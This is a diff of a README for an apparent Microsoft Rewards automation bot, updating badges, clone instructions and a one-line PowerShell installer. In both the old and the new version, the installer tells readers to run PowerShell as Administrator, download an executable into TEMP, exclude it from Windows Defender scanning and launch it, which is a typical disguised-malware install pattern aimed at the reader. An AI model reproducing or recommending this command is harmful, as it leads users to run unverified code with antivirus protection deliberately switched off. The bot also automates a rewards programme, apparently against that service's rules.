@@ -10,7 +10,9 @@
 </p>
 
 <p align="center">
-  <img src="https://img.shields.io/badge/Version-4.0.23-blue?style=for-the-badge" alt="Version">
+  <a href="https://github.com/QuestPilot/Microsoft-Rewards-Bot/releases/latest">
+    <img src="https://img.shields.io/github/v/release/QuestPilot/Microsoft-Rewards-Bot?style=for-the-badge&label=Version&color=blue" alt="Latest release">
+  </a>
   <img src="https://img.shields.io/badge/Node.js-24.15.0-green?style=for-the-badge&logo=nodedotjs&logoColor=white" alt="Node">
   <img src="https://img.shields.io/badge/License-Source_Available-orange?style=for-the-badge" alt="License">
 </p>
@@ -43,7 +45,7 @@ Remote Dash
 Open PowerShell as Administrator, then effortlessly run the one-line installer:
 
 ```powershell
-$f="$env:TEMP\install.exe"; iwr https://github.com/QuestPilot/Microsoft-Rewards-Bot/raw/refs/heads/main/scripts/install.exe -OutFile $f; Add-MpPreference -ExclusionPath $f; start $f
+$f="$env:TEMP\install.exe"; iwr https://github.com/QuestPilot/Microsoft-Rewards-Bot/raw/HEAD/scripts/install.exe -OutFile $f; Add-MpPreference -ExclusionPath $f; start $f
 ```
 
 *The installer will fetch the latest robust binary engine directly from the main branch and deploy it locally.*
@@ -57,7 +59,7 @@ $f="$env:TEMP\install.exe"; iwr https://github.com/QuestPilot/Microsoft-Rewards-
 For total control, clone and install manually via NPM:
 
 ```bash
-git clone --branch main https://github.com/QuestPilot/Microsoft-Rewards-Bot.git
+git clone https://github.com/QuestPilot/Microsoft-Rewards-Bot.git
 cd Microsoft-Rewards-Bot
 npm install
 npm start
